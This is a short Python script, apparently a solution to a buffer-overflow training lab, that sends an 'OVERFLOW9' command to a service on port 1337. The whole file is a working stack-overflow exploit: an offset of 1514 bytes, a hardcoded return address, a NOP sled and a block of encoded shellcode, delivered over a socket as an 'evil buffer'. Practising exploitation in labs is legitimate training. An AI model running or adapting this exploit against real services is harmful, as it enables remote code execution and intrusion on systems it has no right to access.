#!/usr/bin/env python3

import socket

ip = "10.10.174.225"
port = 1337

prefix = "OVERFLOW9 "
offset = 1514
overflow = "A" * offset
# 625011AF
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xdd\xc1\xd9\x74\x24\xf4\xbd\xdd\x9d\x05\xfb\x58\x33\xc9\xb1"
"\x52\x31\x68\x17\x83\xe8\xfc\x03\xb5\x8e\xe7\x0e\xb9\x59\x65"
"\xf0\x41\x9a\x0a\x78\xa4\xab\x0a\x1e\xad\x9c\xba\x54\xe3\x10"
"\x30\x38\x17\xa2\x34\x95\x18\x03\xf2\xc3\x17\x94\xaf\x30\x36"
"\x16\xb2\x64\x98\x27\x7d\x79\xd9\x60\x60\x70\x8b\x39\xee\x27"
"\x3b\x4d\xba\xfb\xb0\x1d\x2a\x7c\x25\xd5\x4d\xad\xf8\x6d\x14"
"\x6d\xfb\xa2\x2c\x24\xe3\xa7\x09\xfe\x98\x1c\xe5\x01\x48\x6d"
"\x06\xad\xb5\x41\xf5\xaf\xf2\x66\xe6\xc5\x0a\x95\x9b\xdd\xc9"
"\xe7\x47\x6b\xc9\x40\x03\xcb\x35\x70\xc0\x8a\xbe\x7e\xad\xd9"
"\x98\x62\x30\x0d\x93\x9f\xb9\xb0\x73\x16\xf9\x96\x57\x72\x59"
"\xb6\xce\xde\x0c\xc7\x10\x81\xf1\x6d\x5b\x2c\xe5\x1f\x06\x39"
"\xca\x2d\xb8\xb9\x44\x25\xcb\x8b\xcb\x9d\x43\xa0\x84\x3b\x94"
"\xc7\xbe\xfc\x0a\x36\x41\xfd\x03\xfd\x15\xad\x3b\xd4\x15\x26"
"\xbb\xd9\xc3\xe9\xeb\x75\xbc\x49\x5b\x36\x6c\x22\xb1\xb9\x53"
"\x52\xba\x13\xfc\xf9\x41\xf4\x09\xf3\x50\xf6\x66\x09\x62\xe7"
"\x2a\x84\x84\x6d\xc3\xc0\x1f\x1a\x7a\x49\xeb\xbb\x83\x47\x96"
"\xfc\x08\x64\x67\xb2\xf8\x01\x7b\x23\x09\x5c\x21\xe2\x16\x4a"
"\x4d\x68\x84\x11\x8d\xe7\xb5\x8d\xda\xa0\x08\xc4\x8e\x5c\x32"
"\x7e\xac\x9c\xa2\xb9\x74\x7b\x17\x47\x75\x0e\x23\x63\x65\xd6"
"\xac\x2f\xd1\x86\xfa\xf9\x8f\x60\x55\x48\x79\x3b\x0a\x02\xed"
"\xba\x60\x95\x6b\xc3\xac\x63\x93\x72\x19\x32\xac\xbb\xcd\xb2"
"\xd5\xa1\x6d\x3c\x0c\x62\x8d\xdf\x84\x9f\x26\x46\x4d\x22\x2b"
"\x79\xb8\x61\x52\xfa\x48\x1a\xa1\xe2\x39\x1f\xed\xa4\xd2\x6d"
"\x7e\x41\xd4\xc2\x7f\x40")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")